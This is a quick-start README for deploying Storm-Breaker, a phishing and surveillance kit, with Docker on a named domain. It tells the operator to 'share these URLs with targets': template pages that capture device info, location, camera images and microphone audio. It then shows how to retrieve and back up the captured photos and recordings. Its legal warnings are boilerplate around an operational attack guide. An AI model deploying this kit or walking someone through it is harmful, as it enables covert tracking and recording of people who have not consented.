# Storm-Breaker Docker Quick Start

## ⚠️ Legal Warning

**This tool is for AUTHORIZED security testing only. Unauthorized use is illegal.**

---

## Quick Deployment (3 Steps)

### Step 1: Setup SSL Certificate

Choose one option:

**Option A: Let's Encrypt (Production)**
```bash
./deploy.sh ssl
```

**Option B: Self-Signed (Testing)**
```bash
./deploy.sh self-ssl
```

### Step 2: Configure Admin Password

```bash
nano storm-web/config.php
# Change the password field
```

### Step 3: Start Services

```bash
./deploy.sh start
```

Done! Access your panel at: `https://uzyol.uz`

---

## Management Commands

```bash
./deploy.sh start      # Start services
./deploy.sh stop       # Stop services
./deploy.sh restart    # Restart services
./deploy.sh logs       # View logs
./deploy.sh status     # Check status
./deploy.sh renew-ssl  # Renew SSL certificate
```

---

## Template URLs

After deployment, share these URLs with targets:

- **Device Info**: `https://uzyol.uz/templates/normal_data/index.html`
- **Location**: `https://uzyol.uz/templates/nearyou/index.html`
- **Camera**: `https://uzyol.uz/templates/camera_temp/index.html`
- **Microphone**: `https://uzyol.uz/templates/microphone/index.html`

**Admin Panel**: `https://uzyol.uz` (login: admin/yourpassword)

---

## Accessing Collected Data

### Via Admin Panel
1. Go to `https://uzyol.uz`
2. Login with admin credentials
3. View collected data in the panel

### Via Server Files
```bash
# View captured images
ls -lah storm-web/images/

# View recorded audio
ls -lah storm-web/sounds/

# Download to local machine
scp -r user@server:/path/to/Storm-Breaker/storm-web/images ./
```

---

## Troubleshooting

### Services won't start
```bash
./deploy.sh check  # Check requirements
docker-compose logs  # View error logs
```

### SSL certificate errors
```bash
# Regenerate self-signed
./deploy.sh self-ssl

# Or setup Let's Encrypt
./deploy.sh ssl
```

### Can't access website
```bash
# Check firewall
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp

# Check DNS
nslookup uzyol.uz

# Check services
./deploy.sh status
```

---

## Security Tips

1. **Change default password** in `storm-web/config.php`
2. **Use strong SSL certificate** (Let's Encrypt, not self-signed)
3. **Restrict admin panel** access by IP (edit `nginx/nginx.conf`)
4. **Monitor logs** regularly: `./deploy.sh logs`
5. **Backup data** regularly: `tar -czf backup.tar.gz storm-web/images storm-web/sounds`

---

## Complete Documentation

For detailed documentation, see: [DEPLOYMENT.md](DEPLOYMENT.md)

---

## Need Help?

- Check logs: `./deploy.sh logs`
- Check status: `./deploy.sh status`
- View help: `./deploy.sh help`
- Read full docs: `DEPLOYMENT.md`

---

**Remember: Only use with proper authorization and legal compliance!**
